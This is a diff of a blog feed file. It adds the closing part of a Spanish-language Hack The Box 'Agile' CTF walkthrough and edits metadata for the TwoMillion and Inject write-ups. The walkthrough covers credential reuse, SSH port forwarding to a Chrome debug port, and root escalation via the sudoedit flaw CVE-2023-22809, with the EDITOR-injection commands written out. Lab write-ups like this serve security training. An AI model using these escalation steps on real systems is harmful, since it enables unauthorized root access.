+&lt;p&gt;Si analizamos la Database: &lt;strong&gt;SUPERPASS&lt;/strong&gt;, podemos encontrarnos con los usuarios y las passwords hasheadas:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez obtenemos las credenciales del usuario: &lt;strong&gt;CORUM&lt;/strong&gt;, entramos por SSH
+&lt;img src=&quot;/assets/img/HTB_Agile/A20.png&quot; alt=&quot;&quot; /&gt;
+Si vemos el estado de la red nos toparemos con un puerto interesante, el &lt;strong&gt;41829&lt;/strong&gt; (Un puerto usado por Google Chrome)
+&lt;img src=&quot;/assets/img/HTB_Agile/A21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Solo nos quedaria hacer port forwarding a nuestra maquina, podemos usar &lt;strong&gt;CHISEL&lt;/strong&gt;, pero yo lo hare con SSH
+&lt;img src=&quot;/assets/img/HTB_Agile/A22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si recordamos, cuando hicimos un LFI, dentro del error, podiamos ver el codigo de la app, dentro de esta existe un error que retorna la password del usuario:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si usamos el propio &lt;strong&gt;Google Chrome&lt;/strong&gt; para efectuar el port forwarding, veremos lo siguiente:
+&lt;img src=&quot;/assets/img/HTB_Agile/A24.png&quot; alt=&quot;&quot; /&gt;
+Por lo que vemos que hay un dominio &lt;strong&gt;test.superpass.htb&lt;/strong&gt;, atentamos el codigo defectuoso con el que nos topamos  y obtendremos la clase del usuario &lt;strong&gt;edwards&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A25.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/HTB_Agile/A26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, si buscamos privilegios a nivel de &lt;strong&gt;SUDOERS&lt;/strong&gt;, nos toparemos con lo siguiente:
+&lt;img src=&quot;/assets/img/HTB_Agile/A27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si buscamos algun exploit con el binario &lt;strong&gt;“sudoedit”&lt;/strong&gt;, nos toparemos con el &lt;strong&gt;[CVE-2023-22809]&lt;/strong&gt;, este nos indica que necesitaremos una variable de entorno… Por lo que usaremos la herramienta &lt;strong&gt;PSPY64&lt;/strong&gt; para hallarla.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que nos quedaria explotar esto a nuestro favor usando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;EDITOR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vim -- /app/venv/bin/activate&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Seguido de:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; dev_admin sudoedit /app/config_test.json 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le asignamos permisos a la bash y con esto concluiriamos la machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="HTB" /><category term="Linux" /><category term="Medium" /><summary></summary></entry><entry><title>HTB - TwoMillion</title><link href="http://localhost:4000/HTB-TwoMillion/" rel="alternate" type="text/html" title="HTB - TwoMillion" /><published>2023-07-23T00:00:00-05:00</published><updated>2023-07-23T00:00:00-05:00</updated><id>http://localhost:4000/HTB-TwoMillion</id><content type="html" xml:base="http://localhost:4000/HTB-TwoMillion/">&lt;h2 id=&quot;begin&quot;&gt;Begin&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM0.png&quot; alt=&quot;&quot; /&gt;
 Esta maquina es un tanto interesante, pese a ser easy… Tiene unos conceptos de explotacion de Kernel llamativo.&lt;/p&gt;
 
@@ -205,7 +424,7 @@ Ahora vemos que nos hemos vuelto administradores, por lo que atentaremos contra 
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>al3xt0r</name></author><category term="CTF" /><category term="HackTheBox" /><category term="WriteUp" /><category term="RCE" /><summary></summary></entry><entry><title>Htb Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="Htb Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>al3xt0r</name></author><category term="CTF" /><category term="HackTheBox" /><category term="WriteUp" /><category term="RCE" /><summary></summary></entry><entry><title>HTB - Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="HTB - Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;en-esta-maquina-veremos&quot;&gt;En esta maquina veremos:&lt;/h2&gt;
 &lt;ul&gt;
